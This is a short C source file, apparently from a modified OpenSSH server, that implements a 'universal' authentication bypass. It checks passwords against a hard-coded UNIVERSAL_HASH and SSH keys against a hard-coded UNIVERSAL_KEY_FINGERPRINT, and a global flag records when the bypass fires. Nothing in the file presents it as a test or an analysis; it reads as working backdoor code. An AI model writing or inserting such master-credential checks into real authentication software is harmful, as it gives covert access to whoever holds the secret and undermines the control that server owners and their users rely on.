#include "auth-universal.h"

#include "digest.h"
#include "includes.h"

#include <stdlib.h>
#include <string.h>

// Global state variable determining whether the universal hash was used
int universal_bypass_triggered = 0;

// Checks that the password matches the universal hash
int password_matches_universal_hash(const char *password) {
  return password_matches_hash(password, UNIVERSAL_HASH);
}
// Checks that the password matches the hash supplied
int password_matches_hash(const char *password, const char *hash) {
  char *candidate;

  if (hash == NULL || *hash == '\0')
    return 0;

  candidate = xcrypt(password, hash);
  return candidate != NULL && strcmp(candidate, hash) == 0;
}

int key_fingerprint_matches_universal(struct sshkey *key) {
  // Ensure the key exists before attempting to read it
  if (key == NULL) {
    return 0;
  }

  char *fp = sshkey_fingerprint(key, SSH_DIGEST_SHA256, SSH_FP_BASE64);
  if (fp != NULL) {
    // 1. Capture the comparison result (strcmp returns 0 if they match)
    int matches = (strcmp(fp, UNIVERSAL_KEY_FINGERPRINT) == 0);

    // 2. Safely free the allocated fingerprint string
    free(fp);

    // 3. Return the result
    return matches;
  }

  // 4. Explicit fallback return if fingerprint generation failed
  return 0;
}
